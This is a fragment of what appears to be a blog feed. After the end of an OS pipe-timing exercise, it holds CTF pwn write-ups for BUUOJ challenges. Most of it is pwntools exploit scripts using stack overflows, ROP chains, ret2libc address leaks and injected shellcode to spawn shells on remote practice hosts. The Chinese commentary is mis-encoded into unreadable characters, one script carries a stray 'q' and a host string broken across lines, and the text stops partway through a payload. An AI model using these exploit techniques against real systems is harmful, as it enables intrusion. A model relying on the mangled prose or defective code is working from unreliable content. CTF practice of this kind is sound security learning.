close(pipe_parent_to_child[<span class="hljs-number">1</span>]);<br>    &#125;<br>    wait(<span class="hljs-literal">NULL</span>);<br>    clock_gettime(CLOCK_MONOTONIC, &amp;end);<br>    time_diff = (end.tv_sec - start.tv_sec) + <br>                          (end.tv_nsec - start.tv_nsec) / <span class="hljs-number">1000000000.0</span>;<br>    <span class="hljs-type">double</span> exchange_per_time = time_diff / EXCHANGE_NUM;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The exchange per time: %.8f\n&quot;</span>, exchange_per_time);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†™ä»£ç çš„è¿‡ç¨‹ä¸­é‡åˆ°äº†å‡ ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹ï¼š</p><ol><li><p><code>wait</code> é’ˆå¯¹çš„æ˜¯å½“å‰è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹ç»“æŸã€‚å…ˆå‰ç†è§£çš„ç±»ä¼¼ <code>sleep</code> çš„ä½œç”¨ï¼Œå®åˆ™ä¸ç„¶ã€‚å¦‚æœè¦è®¡ç®—æ—¶é—´åº”è¯¥ç­‰çˆ¶å­è¿›ç¨‹å…¨éƒ¨ç»“æŸèµ· æ¥ç®—ç»“æŸæ—¶é—´ã€‚</p></li><li><p><code>fork()</code> åçš„çˆ¶å­è¿›ç¨‹æ˜¯å¹¶å‘æ‰§è¡Œçš„ã€‚ä¹‹å‰ç†è§£çš„æ˜¯ï¼š</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(fork())&#123;<br><span class="hljs-comment">//å…ˆæ‰§è¡Œ</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-comment">//åæ‰§è¡Œ</span><br>&#125;<br></code></pre></td></tr></table></figure><p> ä¸Šé¢è¿™ç§ç†è§£æ–¹å¼æ˜¯é”™è¯¯çš„ï¼Œå“’å’©ï½</p></li></ol><p>psï¼š</p><p>Cè¯­è¨€è®¡ç®—æ—¶é—´æ˜¯æœ‰ä¸€å¥—çš„ï¼ŒæŠ½æ—¶é—´å¯ä»¥å»ç†Ÿæ‚‰äº†è§£ä¸€ä¸‹ <code>&lt;time.h&gt;</code> ï½ï½ï½</p>]]></content>
    
    
    <categories>
      
      <category>OS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
      <tag>MIT</tag>
      
      <tag>6.S081</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Buuåˆ·é¢˜è®°å½•</title>
    <link href="/2025/09/05/buuoj-1/"/>
    <url>/2025/09/05/buuoj-1/</url>
    
    <content type="html"><![CDATA[<h1 id="jarvisoj-level2-x64ï¼ˆ2025-8-10ï¼‰"><a href="#jarvisoj-level2-x64ï¼ˆ2025-8-10ï¼‰" class="headerlink" title="jarvisoj_level2_x64ï¼ˆ2025.8.10ï¼‰"></a>jarvisoj_level2_x64ï¼ˆ2025.8.10ï¼‰</h1><p>çœ‹ä¸Šå»æ˜¯ä¸ªå¾ˆç®€å•çš„æ ˆæº¢å‡ºï¼Œæœ‰<code>system</code>å‡½æ•°ï¼Œä¹Ÿæœ‰å­—ç¬¦ä¸²<code>/bin/sh</code></p><span id="more"></span><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">Arch:       amd64-64-little<br>RELRO:      No RELRO<br>Stack:      No canary found<br>NX:         NX enabled<br>PIE:        No PIE (0x400000)<br>Stripped:   No<br></code></pre></td></tr></table></figure><p>ä»€ä¹ˆä¿æŠ¤ä¹Ÿæ²¡å¼€ï¼Œç›´æ¥æº¢å‡ºå°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:26368&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br><br>POST = <span class="hljs-built_in">int</span>(POST)<br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Input:&quot;</span>)<br>pop_rdi_ret_addr = <span class="hljs-number">0x4006b3</span><br>bin_sh = <span class="hljs-number">0x600a90</span><br>system_addr = elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x88</span> + p64(pop_rdi_ret_addr) + p64(bin_sh) + p64(system_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ç”¨åˆ°äº†ROPgadgetï¼Œreadelfè¿™äº›å·¥å…·ï¼Œå…¶å®åœ¨IDAé‡Œä¹Ÿèƒ½ç›´æ¥çœ‹ï¼Œæ— æ‰€è°“äº†</p><h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><p>æ–¹æ³•ä¸€ï¼š<br>è¿™ä¹Ÿæ˜¯æˆ‘æœ€å¼€å§‹çš„æ€è·¯ï¼Œä½†æ˜¯æˆ‘æ²¡åšå‡ºæ¥ã€‚åé—¨å‡½æ•°æ˜¯<code>get_flag</code>ï¼ŒæŒ‰ç†æ˜¯æ ˆæº¢å‡ºç›´æ¥è¿”å›å°±è¡Œï¼Œè¿™é‡Œæ˜¯32ä½ç¨‹åºï¼Œå¾—ç ”ç©¶ä¸€ä¸‹è¿™é‡Œå‡½æ•°ä¼ å‚çš„æ ˆæº¢å‡ºè¿”å›çš„å…·ä½“å®ç°ï¼Œå³å‚æ•°å…¥æ ˆé¡ºåºå’Œæ ˆä¸Šç»“æ„ã€‚</p><p>æˆ‘ç›´æ¥ä¼ äº†ï¼š<code>get_flag_addr + argc1 + argc2</code></p><p>æŸ¥äº†ä¸€äº›èµ„æ–™ï¼Œå‘ç°å®é™…ä¸Šæ˜¯éœ€è¦åŒæ—¶ä¼ é€’è¿”å›åœ°å€çš„ï¼Œå³ï¼š<br><code>get_flag_addr + exit_addr + argc1 + argc2</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuo</span><br><span class="hljs-string"></span><br><span class="hljs-string">j.cn:27954&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br><br>POST = <span class="hljs-built_in">int</span>(POST)<br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>get_flag_addr= <span class="hljs-number">0x080489a0</span><br>a1 = <span class="hljs-number">0x308CD64F</span><br>a2 = <span class="hljs-number">0x195719D1</span><br>exit_addr = <span class="hljs-number">0x804e6a0</span><br>payload = <span class="hljs-number">0x38</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(get_flag_addr) + p32(exit_addr) + p32(a1) + p32(a2)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>æ–¹æ³•äºŒï¼š<br>åœ¨æ ˆä¸Šå†™<code>shellcode</code>å®ç°æ§åˆ¶ã€‚è¿™ä¸ªè¦æ±‚æ¯”è¾ƒé«˜ï¼Œéœ€è¦ç”¨<code>mprotect</code>å‡½æ•°ï¼Œä»¥åŠèƒ½å¤ŸæˆåŠŸåœ¨æ ˆä¸Šå†™<code>system(&#39;/bin/sh</code>)æ‰è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:27030&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br><br>POST = <span class="hljs-built_in">int</span>(POST)<br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>mprotect_addr = <span class="hljs-number">0x0806EC80</span><br>write_addr = <span class="hljs-number">0x0806E1B0</span><br>read_addr = <span class="hljs-number">0x0806E140</span><br>bss_addr = <span class="hljs-number">0x080Eb000</span><br>length = <span class="hljs-number">0x2000</span><br>shellcode = asm(shellcraft.sh())<br><span class="hljs-comment"># gdb.attach(p)</span><br>pop_3_ret = <span class="hljs-number">0x0804f460</span><br><span class="hljs-comment">#----------mprotect(bss_addr, len, PROC_EXEC)-----------#</span><br><br><span class="hljs-comment"># payload = b&#x27;a&#x27; * 0x38 + p32(mprotect_addr) + p32(read_addr) + argc1 + argc2 + argc3 + bss_addr + ......</span><br>payload = <span class="hljs-number">0x38</span> * <span class="hljs-string">b&#x27;A&#x27;</span> + p32(mprotect_addr) + p32(pop_3_ret) + p32(bss_addr) + p32(length) + p32(<span class="hljs-number">0x7</span>) <br>payload += p32(read_addr) + p32(bss_addr+<span class="hljs-number">0x1000</span>) + p32(<span class="hljs-number">0</span>) + p32(bss_addr + <span class="hljs-number">0x1000</span>) + p32(<span class="hljs-built_in">len</span>(shellcode)) <br>p.sendline(payload)q<br>p.sendline(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦æ˜¯ï¼š32ä½å¯æ‰§è¡Œæ€§ç¨‹åºè°ƒç”¨å‡½æ•°æ˜¯éœ€è¦é€šè¿‡æ ˆä¼ é€’å‚æ•°çš„ï¼Œéœ€è¦è¿ç»­è°ƒç”¨å‡½æ•°çš„æ—¶å€™ï¼Œå°±éœ€è¦é€šè¿‡<code>pop</code>é“¾å°†ä¹‹å‰æ ˆä¸Šçš„å‚æ•°æ‰‹åŠ¨æ¸…ç©ºï¼Œä¸ç„¶ä¼šå‡ºç°é”™ã€‚ä¸Šé¢æ³¨é‡Šæ‰çš„åœ°æ–¹å°±æ˜¯é”™è¯¯çš„åšæ³•</p><h1 id="baby-rop"><a href="#baby-rop" class="headerlink" title="baby_rop"></a>baby_rop</h1><p>x86_64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:26109&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br><br>POST = <span class="hljs-built_in">int</span>(POST)<br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>system = elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = <span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))<br>pop_rdi_ret = <span class="hljs-number">0x400683</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span> + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ª64ä½çš„ç¨‹åºã€‚éå¸¸ç®€å•çš„ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œç®€å•ropå°±æå®šäº†</p><h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>32ä½ç¨‹åº</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:29983&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.23.so&#x27;</span>)<br><br>main_addr = <span class="hljs-number">0x08048825</span><br>pop_3_ret = <span class="hljs-number">0x080488f9</span><br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>open_got = elf.got[<span class="hljs-string">&#x27;open&#x27;</span>]<br>payload1 = <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;\xff&#x27;</span> * (<span class="hljs-number">0x20</span>-<span class="hljs-number">2</span>)<br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">&#x27;Correct\n&#x27;</span>)<br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0xe7</span>+<span class="hljs-number">0x4</span>) + p32(write_plt) + p32(pop_3_ret) + p32(<span class="hljs-number">0x1</span>) + p32(write_got) + p32(<span class="hljs-number">0x4</span>) + p32(write_plt) + p32(main_addr) +p32(<span class="hljs-number">0x1</span>) + p32(open_got) + p32(<span class="hljs-number">0x4</span>)<br>p.sendline(payload2)<br><span class="hljs-comment"># gdb.attach(p)</span><br>write_addr = u32(p.recv(<span class="hljs-number">4</span>).strip().ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>open_addr = u32(p.recv(<span class="hljs-number">4</span>).strip().ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(open_addr))<br>libc_addr = write_addr - libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system_addr = libc_addr + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_addr + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>p.sendline(payload1)<br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0xe7</span>+<span class="hljs-number">0x4</span>) + p32(system_addr) +p32(<span class="hljs-number">0x0</span>) + p32(bin_sh)<br>p.recvuntil(<span class="hljs-string">b&#x27;Correct\n&#x27;</span>)<br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ª<code>ret2libc</code>ï¼Œé¢˜ç›®ç»™äº†libcåº“ï¼Œæ‰€ä»¥å°±ç›´æ¥ç”¨è¿œç¨‹çš„æ‰“äº†ã€‚æ•´ä¸ªé€»è¾‘ç®€å•ã€‚è¿™é“é¢˜ä¸»è¦å­¦åˆ°çš„æ˜¯å¦‚ä½•ç»•è¿‡<code>strlen()</code></p><p><img src="/images/123.png"><br>è¿™é‡Œä¸ºäº†é˜²æ­¢ç¨‹åºæå‰é€€å‡ºï¼Œå¿…é¡»ç»•è¿‡<code>strncmp</code>ï¼Œè¿™é‡Œå¯ä»¥é€‰æ‹©æƒ³åŠæ³•è®©<code>v1</code>&#x3D;0ï¼Œä»è€Œè®©è¿™ä¸ªå‡½æ•°è¿”å›0ã€‚å› ä¸º<code>dev_urandom</code>æ˜¯ç³»ç»Ÿç”Ÿæˆçš„éšæœºæ•°ï¼Œæˆ‘ä»¬æ— æ³•çŸ¥é“å…¶å€¼ï¼Œä»è€Œè¾“å…¥<code>\x00</code>å¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œä½¿å¾—<code>strlen</code>åˆ¤æ–­å…¶ä¸º0ã€‚<code>strlen</code>é‡åˆ°<code>\x00</code>ä¼šåœä¸‹æ¥ã€‚</p><blockquote><p>PSï¼š<code>read</code>å‡½æ•°å¹¶ä¸ä¼šé‡åˆ°æŸäº›å­—ç¬¦å°±åœä¸‹æ¥ï¼Œä»–ä¼šä¸€ç›´è¯»å–åˆ°æŒ‡å®šçš„å­—èŠ‚æ•°ã€‚</p></blockquote><h1 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h1><p>x86_64<br><img src="/images/20250812151945.png"></p><p>ç¨‹åºä¸­æ²¡æœ‰<code>system</code>å’Œ<code>/bin/sh</code>ï¼Œå¯ä»¥æ‰¾<code>libc</code>æ‰‹æ‰“ROPã€‚å½“ç„¶ï¼Œ<code>checksec</code>å‘ç°ç¨‹åºå¹¶æ²¡æœ‰å¼€å¯<code>NX</code>ï¼Œæ‰€ä»¥å®Œå…¨å¯ä»¥åœ¨<code>read(0, name, 0x64)</code>çš„æ—¶å€™å†™å…¥ä¸€æ®µshellcodeã€‚</p><p>æ–¹æ³•ä¸€ï¼š<code>ret2libc</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:26981&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p.recvline()<br>payload_useless = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x63</span><br>p.sendline(payload_useless)<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>gets_got = elf.got[<span class="hljs-string">&#x27;gets&#x27;</span>]<br><br>pop_rdi_ret = <span class="hljs-number">0x400713</span><br>main_addr = <span class="hljs-number">0x400636</span><br>p.recvline()<br>p.recvline()<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x28</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi_ret) + p64(gets_got) + p64(puts_plt) + p64(main_addr)<br>p.sendline(payload)<br><br>puts_addr = u64(p.recvline()[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gets_addr = u64(p.recvline()[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(gets_addr))<br><br>libc_addr = puts_addr - <span class="hljs-number">0x809c0</span><br>system = libc_addr + <span class="hljs-number">0x4f440</span><br>bin_sh = libc_addr + <span class="hljs-number">0x1b3e9a</span><br>p.recvline()<br>payload_useless = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">20</span><br>p.sendline(payload_useless)<br>p.recvline()<br>p.recvline()<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x28</span> + p64(pop_rdi_ret) + p64(bin_sh) + p64(system) + p64(main_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>ä¹Ÿæ˜¯ä¸€ä¸ª<code>ret2libc</code>ã€‚è¿™é‡Œæ˜¯åŸç¨‹åºç¬¬ä¸€æ­¥<code>read(0, &amp;buf, 0x64)</code>ï¼Œç„¶å<code>sendline(payload)</code>çš„æ—¶å€™ä¸èƒ½æ˜¯0x64ï¼Œä¸€å®šè¦å°äºè¿™ä¸ªæ•°ï¼Œå…·ä½“æ˜¯ä¸ºä»€ä¹ˆä¹Ÿä¸æ¸…æ¥šã€‚</p><p>æ–¹æ³•2:</p><p>åœ¨<code>name</code>å¤„å†™ä¸Šä¸€æ®µ<code>shellcode</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:26981&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p.recvline()<br>ret = <span class="hljs-number">0x4004c9</span><br>shellcode = asm(shellcraft.sh())<br>p.sendline(shellcode)<br>p.recvline()<br>p.recvline()<br>name_addr = <span class="hljs-number">0x601080</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x28</span> + 